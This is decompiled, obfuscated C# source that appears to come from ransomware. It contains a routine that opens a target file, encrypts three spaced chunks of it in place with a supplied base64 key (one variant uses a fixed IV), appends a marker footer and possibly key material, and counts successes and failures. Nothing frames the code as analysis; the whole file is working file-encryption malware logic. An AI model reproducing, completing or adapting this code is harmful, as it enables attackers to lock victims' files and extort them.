using System;
using System.IO;
using System.Text;
using NBrvMqVjNNTT;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jDlAujUelC;

internal sealed class GwvItkvAvmqBoMs
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int YGVjPUPmPxys(long long_0)
	{
		return (int)long_0;
	}

	public static bool bEpaIEDRMOENWhX(string gmUeyKIYYh, string mOmObPhyrfbap, string VAYDgRLIDTJJZ, byte[] vPhSbxKmvJRCRMv = null, byte[] ugKZMIXtHOe = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(gmUeyKIYYh, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = YGVjPUPmPxys(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(mOmObPhyrfbap) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(mOmObPhyrfbap) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(mOmObPhyrfbap) * 1024 * 1024) / 10;
				}
				int jCuelakbmZUVMV = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = kaKVyOKBqY(gmUeyKIYYh, fileStream, jCuelakbmZUVMV, num * i);
					array = (hNCHegfceoe.vGfsNnNMtKaym ? GpnnmMPrTtDBD.kAaFSjIASsxCjS(byte_, Convert.FromBase64String(VAYDgRLIDTJJZ), ugKZMIXtHOe) : NaRnXemgrEhEu.vWTJMcrwiwmBiRL(byte_, Convert.FromBase64String(VAYDgRLIDTJJZ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					ZFNNoWQhwuhBhXI(gmUeyKIYYh, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (hNCHegfceoe.aeWIyHaDtadg ? Encoding.ASCII.GetBytes(hNCHegfceoe.UwCpksGCJZfb(getString_0(107352140)) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353124)) + Convert.ToString(mOmObPhyrfbap) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353124))) : Encoding.ASCII.GetBytes(hNCHegfceoe.UwCpksGCJZfb(getString_0(107352140)) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353133)) + Convert.ToString(mOmObPhyrfbap) + hNCHegfceoe.UwCpksGCJZfb(getString_0(107353133))));
			if (!hNCHegfceoe.aeWIyHaDtadg)
			{
				using FileStream fileStream2 = new FileStream(gmUeyKIYYh, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(gmUeyKIYYh, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(vPhSbxKmvJRCRMv, 0, vPhSbxKmvJRCRMv.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (hNCHegfceoe.LbhjvcCDDsZLYlccs)
			{
				try
				{
					File.AppendAllText(hNCHegfceoe.KymHhFbNcwDYA, getString_0(107404642) + gmUeyKIYYh + getString_0(107352127) + ex.Message + getString_0(107396632));
				}
				catch (Exception)
				{
				}
			}
			hNCHegfceoe.WfLfyuLvRnJc++;
			return false;
		}
		hNCHegfceoe.FqOxBTVEHuVPbA++;
		return true;
	}

	public static byte[] kaKVyOKBqY(string SnzUPrrtRkHSBt, FileStream tTPDapqJoUld, int JCuelakbmZUVMV, int FqZsLGCHuxQtuw = 0)
	{
		byte[] array = new byte[JCuelakbmZUVMV];
		tTPDapqJoUld.Position = FqZsLGCHuxQtuw;
		tTPDapqJoUld.Read(array, 0, JCuelakbmZUVMV);
		return array;
	}

	public static void ZFNNoWQhwuhBhXI(string KJDRexxNdf, FileStream XAxgARevIrF, byte[] XEkIzTnBJLzMphd, int eMyWsAZDTaoDrs = 0)
	{
		XAxgARevIrF.Position = eMyWsAZDTaoDrs;
		XAxgARevIrF.Write(XEkIzTnBJLzMphd, 0, XEkIzTnBJLzMphd.Length);
	}

	static GwvItkvAvmqBoMs()
	{
		Strings.CreateGetStringDelegate(typeof(GwvItkvAvmqBoMs));
	}
}
